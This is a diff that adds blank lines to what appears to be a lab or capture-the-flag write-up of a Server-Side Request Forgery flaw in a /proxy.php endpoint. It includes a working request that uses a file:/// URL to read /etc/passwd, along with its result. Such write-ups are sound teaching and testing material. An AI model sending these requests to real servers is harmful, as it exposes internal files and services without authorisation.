@@ -7,9 +7,13 @@ Exploit Server-Side Request Forgery to access internal services and files, demon
 ## 🔍 Vulnerability Analysis
 
 - **Type:** Server-Side Request Forgery (SSRF)
+
 - **Endpoint:** `GET /proxy.php`
+
 - **Parameter:** `url`
+
 - **Detection:** Unrestricted proxy functionality without internal network restrictions
+
 - **Impact:** Internal service enumeration and sensitive file disclosure
 
 ## 💥 Exploitation
@@ -17,6 +21,7 @@ Exploit Server-Side Request Forgery to access internal services and files, demon
 ### Phase 1: Internal File Disclosure
 
 ```http
+
 GET /proxy.php?url=file:///etc/passwd HTTP/1.1
 Host: northstarstudio.hv
 Result: Retrieved /etc/passwd, identifying last user: beethoven
@@ -48,4 +53,5 @@ Protocol Analysis: Understanding different URL scheme behaviors in SSRF contexts
 ## Notes
 
 Conducted in a controlled environment for educational purposes.
+
 ```
